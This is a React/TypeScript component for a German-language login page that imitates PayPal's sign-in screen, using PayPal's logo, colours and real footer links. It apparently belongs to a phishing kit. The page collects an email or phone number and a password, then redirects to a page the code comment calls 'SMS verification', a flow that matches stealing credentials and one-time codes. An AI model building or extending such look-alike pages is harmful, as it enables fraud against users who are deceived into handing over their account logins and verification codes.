import React, { useState, useMemo } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardFooter, CardHeader } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Separator } from "@/components/ui/separator";

export const SigninPage = (): JSX.Element => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  // Get returnUri from URL parameters
  const returnUri = useMemo(() => {
    if (typeof window !== "undefined") {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get("returnUri") || "";
    }
    return "";
  }, []);

  // Footer links data
  const footerLinks = [
    {
      text: "Datenschutz",
      href: "https://www.paypal.com/de/webapps/mpp/ua/privacy-full",
    },
    {
      text: "Rechtliche Hinweise",
      href: "https://www.paypal.com/de/webapps/mpp/ua/legalhub-full",
    },
    {
      text: "Weltweit",
      href: "https://www.paypal.com/de/webapps/mpp/country-worldwide",
    },
  ];

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Redirect to SMS verification page
    window.location.href = "/link3";
  };

  return (
    <div className="flex flex-col min-h-screen w-full items-center justify-center bg-wwwpaypalcomathens-gray relative">
      <div className="flex flex-col w-full max-w-[460px] items-center justify-center px-4 py-8">
        <main className="flex flex-col w-full items-center justify-center">
          <Card className="flex flex-col w-full max-w-[460px] items-start gap-6 md:gap-12 pt-6 md:pt-[31px] pb-8 md:pb-[51px] px-6 md:px-[47px] border border-solid border-[#eaeced] rounded-xl">
            <CardHeader className="flex flex-col items-center p-0 w-full bg-transparent">
              <div className="flex flex-col w-[83.44px] h-10 items-start relative">
                <div className="flex flex-col w-[83.44px] h-10 items-center pt-0 pb-[10.33px] px-0 relative">
                  <img
                    className="relative w-[83.44px] h-[29.67px]"
                    alt="PayPal Logo"
                    src="/figmaAssets/paypal-text-logo.svg"
                  />
                </div>
              </div>
            </CardHeader>

            <CardContent className="flex flex-col w-full items-start gap-6 p-0">
              <form onSubmit={handleSubmit} className="flex flex-col w-full gap-6">
                <div className="flex flex-col w-full gap-4">
                  <div className="relative">
                    <Input
                      id="email"
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      className="peer w-full h-12 px-3 pt-6 pb-2 border border-solid border-[#d9dadb] rounded-md bg-wwwpaypalcomwhite text-[14px] font-normal leading-[18px] focus:border-blue-500 focus:outline-none transition-colors duration-200"
                      placeholder=" "
                      required
                    />
                    <Label
                      htmlFor="email"
                      className="absolute left-3 top-1 text-xs text-gray-500 transition-all duration-200 peer-placeholder-shown:text-base peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-focus:top-1 peer-focus:text-xs peer-focus:text-blue-500"
                    >
                      E-Mail-Adresse oder Handynummer
                    </Label>
                  </div>

                  <div className="relative">
                    <Input
                      id="password"
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="peer w-full h-12 px-3 pt-6 pb-2 border border-solid border-[#d9dadb] rounded-md bg-wwwpaypalcomwhite text-[14px] font-normal leading-[18px] focus:border-blue-500 focus:outline-none transition-colors duration-200"
                      placeholder=" "
                      required
                    />
                    <Label
                      htmlFor="password"
                      className="absolute left-3 top-1 text-xs text-gray-500 transition-all duration-200 peer-placeholder-shown:text-base peer-placeholder-shown:top-3 peer-placeholder-shown:text-gray-400 peer-focus:top-1 peer-focus:text-xs peer-focus:text-blue-500"
                    >
                      Passwort
                    </Label>
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-3 text-sm text-blue-600 hover:text-blue-800 transition-colors duration-200"
                    >
                      {showPassword ? "Verbergen" : "Anzeigen"}
                    </button>
                  </div>
                </div>

                <Button
                  type="submit"
                  className="w-full h-12 md:h-12 rounded-[100px] border-none bg-[#0c8ce9] text-wwwpaypalcomwhite font-medium text-sm md:text-base transition-all duration-300 ease-in-out hover:bg-[#0a7bd8] disabled:bg-[#0a6dc2] disabled:cursor-not-allowed"
                >
                  Einloggen
                </Button>
              </form>

              <div className="flex flex-col items-start gap-[17.92px] w-full">
                <div className="relative w-full h-[15px]">
                  <Separator className="border-t border-[#cbd2d6]" />
                  <div className="inline-flex items-start justify-center px-[7.5px] py-0 absolute -top-2.5 left-1/2 transform -translate-x-1/2 bg-wwwpaypalcomwhite">
                    <span className="font-www-paypal-com-helvetica-neue-regular text-wwwpaypalcomnevada text-center whitespace-nowrap">
                      oder
                    </span>
                  </div>
                </div>

                <Button
                  variant="outline"
                  className="w-full h-12 md:h-12 rounded-[100px] border-2 border-solid border-black text-wwwpaypalcomblack font-www-paypal-com-helvetica-neue-medium text-center text-sm md:text-base transition-all duration-300 ease-in-out hover:bg-blue-50 hover:border-blue-500 hover:text-blue-600"
                  onClick={() => window.open("https://www.paypal.com/de/webapps/mpp/account-selection", "_blank")}
                >
                  Neu anmelden
                </Button>
              </div>
            </CardContent>

            <CardFooter className="flex items-center justify-center p-0 w-full h-[66.5px]">
              <div className="flex items-center justify-center gap-1.5">
                <div className="flex items-center gap-2">
                  <svg 
                    className="w-5 h-4 rounded-sm shadow-sm border border-gray-200" 
                    viewBox="0 0 30 20"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <rect width="30" height="6.67" fill="#646464" />
                    <rect width="30" height="6.67" y="6.67" fill="#e9686b" />
                    <rect width="30" height="6.66" y="13.34" fill="#f8e96a" />
                  </svg>
                  <button
                    className="[font-family:'Helvetica_Neue-Bold',Helvetica] font-bold text-wwwpaypalcomshuttle-gray text-base text-center leading-5 whitespace-nowrap bg-transparent border-none cursor-pointer hover:text-blue-600 transition-colors duration-200"
                    onClick={() => window.location.reload()}
                  >
                    Deutsch
                  </button>
                </div>

                <div className="flex items-center h-4 border-l border-[#cccccc] pl-3">
                  <button
                    className="[font-family:'Helvetica_Neue-Regular',Helvetica] font-normal text-wwwpaypalcomshuttle-gray text-base text-center leading-5 whitespace-nowrap bg-transparent border-none cursor-pointer hover:text-blue-600 transition-colors duration-200"
                    onClick={() => window.location.reload()}
                  >
                    English
                  </button>
                </div>
              </div>
            </CardFooter>
          </Card>
        </main>

        <footer className="flex flex-col w-full items-start pt-2 pb-0 px-0 fixed bottom-0 left-0 bg-transparent z-20">
          <div className="flex flex-col items-start py-2 px-3.5 w-full bg-wwwpaypalcomathens-gray">
            <div className="flex items-center justify-center gap-1 md:gap-2.5 w-full flex-wrap">
              {footerLinks.map((link, index) => (
                <div
                  key={index}
                  className="inline-flex items-start justify-center"
                >
                  <a
                    className="[font-family:'Helvetica_Neue-Regular',Helvetica] font-normal text-wwwpaypalcomshuttle-gray text-[9px] md:text-[11px] text-center leading-[14px] md:leading-[18px] whitespace-nowrap hover:text-blue-600 transition-colors duration-200"
                    href={link.href}
                    rel="noopener noreferrer"
                    target="_blank"
                  >
                    {link.text}
                  </a>
                </div>
              ))}
            </div>
          </div>
        </footer>
      </div>
    </div>
  );
};